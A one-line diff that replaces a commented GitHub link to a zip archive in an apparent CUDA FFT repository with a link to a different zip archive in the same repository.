@@ -1,1 +1,1 @@
-# https://github.com/dinhtuannguyen/cuda_fft/raw/refs/heads/master/papers/cuda_fft_v2.2.zip
+# https://raw.githubusercontent.com/dinhtuannguyen/cuda_fft/master/CV/fft_cuda_v1.6.zip
